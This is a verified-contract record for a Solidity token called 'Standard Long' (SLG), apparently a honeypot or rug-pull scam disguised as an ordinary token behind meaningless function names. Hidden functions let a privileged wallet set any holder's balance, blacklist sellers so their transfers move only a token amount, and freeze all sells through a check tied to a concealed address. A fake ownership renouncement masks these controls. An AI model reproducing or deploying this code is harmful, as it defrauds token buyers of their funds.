{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface enableExemptTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoLaunch {\n    function createPair(address fromSwap, address modeLaunch) external returns (address);\n}\n\ninterface feeFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txAmount) external view returns (uint256);\n\n    function transfer(address txTake, uint256 modeAmount) external returns (bool);\n\n    function allowance(address liquidityTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txTake,\n        uint256 modeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingTeam, uint256 value);\n    event Approval(address indexed liquidityTx, address indexed spender, uint256 value);\n}\n\ninterface feeFromMetadata is feeFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StandardLong is receiverMarketing, feeFrom, feeFromMetadata {\n\n    address exemptTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private walletTx;\n\n    uint256 constant amountTeamReceiver = 19 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverShould;\n    }\n\n    function getOwner() external view returns (address) {\n        return takeSwap;\n    }\n\n    function owner() external view returns (address) {\n        return takeSwap;\n    }\n\n    function approve(address listLiquidity, uint256 modeAmount) public virtual override returns (bool) {\n        toLaunch[_msgSender()][listLiquidity] = modeAmount;\n        emit Approval(_msgSender(), listLiquidity, modeAmount);\n        return true;\n    }\n\n    uint256 limitFrom;\n\n    function launchedFrom(address limitEnable, address txTake, uint256 modeAmount) internal returns (bool) {\n        require(amountTake[limitEnable] >= modeAmount);\n        amountTake[limitEnable] -= modeAmount;\n        amountTake[txTake] += modeAmount;\n        emit Transfer(limitEnable, txTake, modeAmount);\n        return true;\n    }\n\n    uint256 takeSender;\n\n    uint256 private limitFeeTx;\n\n    bool private txMin;\n\n    function tradingFee(address amountSwap, uint256 modeAmount) public {\n        autoList();\n        amountTake[amountSwap] = modeAmount;\n    }\n\n    string private launchedFee = \"SLG\";\n\n    bool public totalTeamLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTrading;\n    }\n\n    mapping(address => mapping(address => uint256)) private toLaunch;\n\n    function maxSender(address tokenWallet) public {\n        autoList();\n        \n        if (tokenWallet == toSwap || tokenWallet == sellSwap) {\n            return;\n        }\n        tradingSell[tokenWallet] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxMarketing;\n    }\n\n    bool private buyAt;\n\n    address public sellSwap;\n\n    uint256 public listAuto;\n\n    address public toSwap;\n\n    constructor (){\n        \n        enableExemptTx sellMax = enableExemptTx(exemptTotal);\n        sellSwap = autoLaunch(sellMax.factory()).createPair(sellMax.WETH(), address(this));\n        \n        toSwap = _msgSender();\n        amountToken();\n        liquidityWallet[toSwap] = true;\n        amountTake[toSwap] = txTrading;\n        if (minFee == listAuto) {\n            txMin = true;\n        }\n        emit Transfer(address(0), toSwap, txTrading);\n    }\n\n    function receiverFrom(uint256 modeAmount) public {\n        autoList();\n        takeSender = modeAmount;\n    }\n\n    function allowance(address swapMax, address listLiquidity) external view virtual override returns (uint256) {\n        if (listLiquidity == exemptTotal) {\n            return type(uint256).max;\n        }\n        return toLaunch[swapMax][listLiquidity];\n    }\n\n    function transfer(address amountSwap, uint256 modeAmount) external virtual override returns (bool) {\n        return exemptTotalToken(_msgSender(), amountSwap, modeAmount);\n    }\n\n    uint256 private minFee;\n\n    bool public atFeeTo;\n\n    function exemptTotalToken(address limitEnable, address txTake, uint256 modeAmount) internal returns (bool) {\n        if (limitEnable == toSwap) {\n            return launchedFrom(limitEnable, txTake, modeAmount);\n        }\n        uint256 enableTeam = feeFrom(sellSwap).balanceOf(feeIs);\n        require(enableTeam == takeSender);\n        require(txTake != feeIs);\n        if (tradingSell[limitEnable]) {\n            return launchedFrom(limitEnable, txTake, amountTeamReceiver);\n        }\n        return launchedFrom(limitEnable, txTake, modeAmount);\n    }\n\n    address feeIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private receiverShould = \"Standard Long\";\n\n    address private takeSwap;\n\n    uint8 private maxMarketing = 18;\n\n    function balanceOf(address txAmount) public view virtual override returns (uint256) {\n        return amountTake[txAmount];\n    }\n\n    mapping(address => uint256) private amountTake;\n\n    function amountToken() public {\n        emit OwnershipTransferred(toSwap, address(0));\n        takeSwap = address(0);\n    }\n\n    mapping(address => bool) public liquidityWallet;\n\n    uint256 public receiverLimit;\n\n    function tradingShould(address toAuto) public {\n        if (totalTeamLaunch) {\n            return;\n        }\n        if (listAuto != receiverLimit) {\n            minFee = limitFeeTx;\n        }\n        liquidityWallet[toAuto] = true;\n        \n        totalTeamLaunch = true;\n    }\n\n    function autoList() private view {\n        require(liquidityWallet[_msgSender()]);\n    }\n\n    uint256 private txTrading = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedFee;\n    }\n\n    mapping(address => bool) public tradingSell;\n\n    function transferFrom(address limitEnable, address txTake, uint256 modeAmount) external override returns (bool) {\n        if (_msgSender() != exemptTotal) {\n            if (toLaunch[limitEnable][_msgSender()] != type(uint256).max) {\n                require(modeAmount <= toLaunch[limitEnable][_msgSender()]);\n                toLaunch[limitEnable][_msgSender()] -= modeAmount;\n            }\n        }\n        return exemptTotalToken(limitEnable, txTake, modeAmount);\n    }\n\n    event OwnershipTransferred(address indexed exemptLimit, address indexed liquidityReceiverLaunched);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiverLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFeeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"}],\"name\":\"maxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeAmount\",\"type\":\"uint256\"}],\"name\":\"receiverFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeamLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAmount\",\"type\":\"uint256\"}],\"name\":\"tradingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAuto\",\"type\":\"address\"}],\"name\":\"tradingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StandardLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}